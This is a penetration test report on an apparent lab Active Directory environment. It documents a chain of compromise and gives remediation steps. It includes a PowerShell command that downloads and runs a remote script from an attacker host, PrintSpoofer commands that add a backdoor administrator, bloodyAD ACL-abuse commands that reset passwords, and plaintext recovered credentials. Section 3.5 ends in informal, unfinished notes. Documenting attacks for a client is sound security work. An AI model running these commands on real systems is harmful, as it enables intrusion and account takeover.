---
tags:
  - report
  - pentest
  - active-directory
  - horrorland
date: 2026-01-22
client: HorrorLand Corp
author: Ahmed Emad
version: 1.0
status: Final
---

# Penetration Test Report
**Client:** [[HorrorLand Corp]]
**Date:** 2026-01-22
**Assessment Type:** Internal Network & Active Directory Penetration Test
**Target:** 192.168.56.102 (HorrorLand)
**Lead Pentester:** Ahmed Emad

---

## ðŸ”’ Statement of Confidentiality

> [!danger] CONFIDENTIAL
> The contents of this document have been developed by **ZeroSploit Company**. We consider the contents of this document to be proprietary and business confidential information. This document may not be released to another vendor, business partner, or contractor without prior written consent.

---

## ðŸ“‹ Table of Contents

| Section | Title |
| :--- | :--- |
| **1.0** | **Executive Summary** |
| 1.1 | Assessment Overview |
| 1.2 | Key Findings |
| **2.0** | **Findings Summary** |
| 2.1 | Severity Breakdown |
| 2.2 | Finding List |
| 2.3 | Compromised Users Table |
| **3.0** | **Technical Findings Details** |
| 3.1 | Unprotected Hidden Web Shell (RCE) |
| 3.2 | Local Privilege Escalation via SeImpersonatePrivilege |
| 3.3 | Active Directory AS-REP Roasting |
| 3.4 | Insecure DACL/ACL Configurations (Attack Chain) |
| 3.5 | Hardcoded Credentials in Mobile Application |
| **4.0** | **Remediation Plan** |

---

## 1. Executive Summary

**ZeroSploit Company** performed a penetration test against the **HorrorLand** infrastructure. The objective was to simulate an internal breach and assess the security posture of the Active Directory environment.

### 1.1 Assessment Overview
The assessment began with the identification of a hidden web directory containing a PHP backdoor, which allowed for immediate Remote Code Execution (RCE). Following initial access, the assessor identified that the service account possessed the critical `SeImpersonatePrivilege`, allowing for immediate escalation to **SYSTEM** level privileges on the local machine.

Moving laterally through the Active Directory, multiple misconfigurations were exploited, including AS-REP Roasting, abusive Access Control Lists (DACLs), and Targeted Kerberoasting. Finally, sensitive credentials were recovered by reverse-engineering an Android Package (APK) found on a network share, leading to further domain compromise.

### 1.2 Key Findings
* **Critical:** Full Local System compromise via PrintSpoofer.
* **Critical:** Domain Lateral Movement via ACL abuse (Force Change Password, GenericAll).
* **High:** Hardcoded AES-encrypted credentials inside a mobile app.
* **High:** Weak Kerberos configurations allowing offline password cracking.

---

## 2. Findings Summary

### 2.1 Severity Breakdown

| Severity | Count |
| :--- | :---: |
| ðŸ”´ **Critical** | 3 |
| ðŸŸ  **High** | 2 |
| ðŸŸ¡ **Medium** | 0 |
| âšª **Info** | 1 |
| **Total** | **6** |

### 2.2 Finding List

| ID | Severity | Finding Name |
| :--- | :--- | :--- |
| 1 | ðŸ”´ Critical | Unprotected Hidden Web Shell (RCE) |
| 2 | ðŸ”´ Critical | Local Privilege Escalation via SeImpersonatePrivilege |
| 3 | ðŸ”´ Critical | Insecure DACL/ACL Configurations (Attack Chain) |
| 4 | ðŸŸ  High | Active Directory AS-REP Roasting |
| 5 | ðŸŸ  High | Hardcoded Credentials in Mobile Application |
| 6 | âšª Info | Information Disclosure via Github |

### 2.3 Compromised Users Table

| Username              | Domain     | Method of Compromise      | Access Level        |
| :-------------------- | :--------- | :------------------------ | :------------------ |
| `mohamed.hytham`      | HORRORLAND | Web Shell RCE             | Service Account     |
| `hacker`              | LOCAL      | Created via PrintSpoofer  | Local Administrator |
| `NT AUTHORITY\SYSTEM` | LOCAL      | SeImpersonate Privilege   | System              |
| `mohamed.hytham`      | HORRORLAND | AS-REP Roasting           | Domain User         |
| `OMAR.FADEL`          | HORRORLAND | Force Password Change ACL | Domain User         |
| `mohamed.mahmoud`     | HORRORLAND | Targeted Kerberoasting    | Domain User         |
| `youssef.elsheikh`    | HORRORLAND | GenericAll / ACL Abuse    | Domain User         |
| `ahmed.gamal`         | HORRORLAND | APK Reverse Engineering   | Domain User         |
| `MOHAMED.ABDELSATAR`  | HORRORLAND | Credential Reuse/SMB      | Domain User         |
| RAMEZ.SABER           |            |                           |                     |

---

## 3. Technical Findings Details

### 3.1 Unprotected Hidden Web Shell (RCE)

> [!fail] Severity: Critical
> **CVSS Score:** 9.8
> **CWE:** [CWE-434](https://cwe.mitre.org/data/definitions/434.html)

#### Description
A hidden directory path was discovered via Open Source Intelligence (OSINT) on the developer's GitHub repository. This path contained a PHP script (`hidden.php`) that allowed for arbitrary command execution.

#### Evidence
**OSINT Discovery:**
The repository `Remo1x/HorrorLand` revealed the path `/veryverysecurepath/hidden.php`.
![[Pasted image 20260122192851.png]]

**Exploitation:**
A PowerShell reverse shell payload was executed via the web terminal:
```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('[http://192.168.56.101:80/shell.ps1](http://192.168.56.101:80/shell.ps1)')"
```
This resulted in a shell as user `mohamed.hytham`.
![[Pasted image 20260122193119.png]]

#### Remediation
* [ ] Remove the `hidden.php` script immediately.
* [ ] Restrict access to internal administrative panels using IP allow-listing and strong authentication.

---

### 3.2 Local Privilege Escalation via SeImpersonatePrivilege

> [!fail] Severity: Critical
> **CVSS Score:** 8.8
> **CWE:** [CWE-269](https://cwe.mitre.org/data/definitions/269.html)

#### Description
The compromised service account `mohamed.hytham` had the `SeImpersonatePrivilege` enabled. This allowed the attacker to use the "PrintSpoofer" exploit to coerce the SYSTEM account to authenticate to a malicious pipe, hijacking the token.

#### Evidence
**Privilege Check:**
`whoami /priv` confirmed `SeImpersonatePrivilege` was enabled.
![[Pasted image 20260122193240.png]]

**Exploitation:**
Using `PrintSpoofer.exe`, a new local administrator user was created.
```cmd
.\PrintSpoofer.exe -i -c "net user hacker Password123! /add"
.\PrintSpoofer.exe -i -c "net localgroup administrators hacker /add"
```
![[Pasted image 20260122193654.png]]

#### Remediation
* [ ] Ensure service accounts are granted the principle of least privilege.
* [ ] Remove `SeImpersonatePrivilege` from web-facing service accounts if not strictly required.

---

### 3.3 Active Directory AS-REP Roasting

> [!fail] Severity: High
> **CVSS Score:** 7.5
> **CWE:** [CWE-522](https://cwe.mitre.org/data/definitions/522.html)

#### Description
The user account `mohamed.hytham` had Kerberos Pre-Authentication disabled (`DONT_REQ_PREAUTH`). This allowed the attacker to request a TGT (Ticket Granting Ticket) for this user without knowing the password, and crack the ticket offline.

#### Evidence
**Enumeration & Cracking:**
BloodHound/SharpHound data revealed the vulnerability. The hash was extracted and cracked.
![[Pasted image 20260122200526.png]]

#### Remediation
* [ ] Enable Kerberos Pre-Authentication for all user accounts in the domain.

---

### 3.4 Insecure DACL/ACL Configurations (Attack Chain)

> [!fail] Severity: Critical
> **CVSS Score:** 9.0
> **CWE:** [CWE-284](https://cwe.mitre.org/data/definitions/284.html)

#### Description
Multiple users in the domain had insecure Access Control Lists (ACLs) allowing for a chain of compromise:
1.  **ForceChangePassword:** Access to `OMAR.FADEL` allowed resetting their password.
2.  **Targeted Kerberoast:** Access to `mohamed.mahmoud` allowed requesting a service ticket and cracking it.
3.  **GenericAll (WriteDacl):** `mohamed.mahmoud` had WriteDacl over `youssef.elsheikh`. This was used to grant full control and reset Youssef's password.
4.  **Group Membership:** `youssef.elsheikh` had `AddSelf` rights to the "MOBILE DEVELOPERS" group.

#### Evidence
**Attack Chain Execution:**
```bash
# Abuse GenericAll to take control of Youssef
bloodyAD ... add genericAll youssef.elsheikh mohamed.mahmoud
bloodyAD ... set password youssef.elsheikh 'HackedPass123!'

# Add Youssef to Mobile Developers
bloodyAD ... add groupMember "MOBILE DEVELOPERS" youssef.elsheikh
```
![[Pasted image 20260122202903.png]]

#### Remediation
* [ ] Audit Active Directory ACLs using tools like BloodHound.
* [ ] Remove dangerous permissions such as `GenericAll`, `WriteDacl`, and `ForceChangePassword` from non-administrative users.

---

### 3.5 Hardcoded Credentials in Mobile Application

> [!fail] Severity: High
> **CVSS Score:** 7.5
> **CWE:** [CWE-798](https://cwe.mitre.org/data/definitions/798.html)

#### Description
An APK file found on the `MOBILE DEVELOPERS` SMB share contained a hardcoded AES key and encrypted credentials. Reverse engineering the Python script allowed for the decryption of credentials for user `ahmed.gamal`.

#### Evidence
**Decryption Script:**
The attacker recreated the AES decryption routine from the Java source code:
```python
# Key: ZeroSploit12345
plaintext = unpad(decrypted_data, AES.block_size).decode('utf-8')
# Result: VeryImposibleP@ssw0rdtoCrack
```
![[Pasted image 20260122203622.png]]

**Access Verification:**
![[Pasted image 20260122203728.png]]

we got another creds 
```
(myenv) âžœ  AD netexec smb 192.168.56.102 -u MOHAMED.ABDELSATAR -p 'VerySecureP@ssw0rd!@#$'
```
![[Pasted image 20260122204307.png]]

then for ramez 
![[Pasted image 20260122205534.png]]
#### Remediation
* [ ] Remove APKs and sensitive data from readable SMB shares.
* [ ] Never hardcode credentials or encryption keys in application source code.

we got a new user 


---

## 4. Remediation Plan

### Immediate Actions
* [ ] **Incident Response:** Trigger incident response procedures to revoke the `hacker` account and reset passwords for all compromised users listed in Section 2.3.
* [ ] **Web Security:** Delete the `hidden.php` backdoor and review the web server for other webshells.
* [ ] **Privilege Management:** Disable `SeImpersonatePrivilege` for the web service account.

### Active Directory Hardening
* [ ] **ACL Audit:** Conduct a full audit of ACLs to remove unintended relationships (GenericAll, WriteDacl) between standard users.
* [ ] **Kerberos:** Enable Pre-Authentication for all users.
* [ ] **SMB Shares:** Restrict access to the "Mobile Developers" share and remove the APK containing credentials.